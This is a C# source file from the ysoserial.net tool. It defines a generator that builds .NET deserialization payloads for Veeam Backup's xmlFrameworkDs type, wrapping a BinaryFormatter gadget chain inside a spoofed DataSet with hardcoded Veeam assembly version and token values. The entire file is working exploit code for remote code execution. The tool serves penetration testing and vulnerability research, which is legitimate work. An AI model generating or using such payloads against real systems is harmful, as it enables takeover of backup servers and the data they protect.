using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.ConstrainedExecution;
using System.Runtime.Serialization;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using NDesk.Options;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    class VeeamXMLFrameworkDsGenerator : DataSetTypeSpoofGenerator
    {
        string veeamBackupEsxManagerVer = "12.1.0.0";
        string veeamBackupEsxManagerToken = "bfd684de2276783a";
        public override string Name()
        {
            return "VeeamXMLFrameworkDs";
        }

        public override string AdditionalInfo()
        {
            return base.AdditionalInfo() + 
                "\nThis version is for Veeam's xmlFrameworkDs, which simply modifies the assembly name and type name in GetObjectData method.";
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                binaryFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
            }


            DataSetSpoofVeeamMarshal payloadDataSetMarshal = new DataSetSpoofVeeamMarshal(binaryFormatterPayload);
            payloadDataSetMarshal.Ver = veeamBackupEsxManagerVer;
            payloadDataSetMarshal.Token = veeamBackupEsxManagerToken;
            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(payloadDataSetMarshal, formatter, inputArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                { "VeeamBackupEsxManagerVer=", "Version of Veeam.Backup.EsxManager assembly", v => veeamBackupEsxManagerVer = v },
                { "VeeamBackupEsxManagerToken=", "PublicKeyToken of Veeam.Backup.EsxManager assembly", v => veeamBackupEsxManagerToken = v },
            };
            return options;
        }
    }

    [Serializable]
    public class DataSetSpoofVeeamMarshal : DataSetSpoofMarshal
    {
        public DataSetSpoofVeeamMarshal(byte[] bfPayload) : base(bfPayload)
        {
        }

        public string Ver { get; set; }
        public string Token { get; set; }

        public override void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            base.GetObjectData(info, context);
            info.AssemblyName = "Veeam.Backup.EsxManager, Version=" + Ver + ", Culture=neutral, PublicKeyToken=" + Token;
            info.FullTypeName = "Veeam.Backup.EsxManager.xmlFrameworkDs";
        }
    }
}
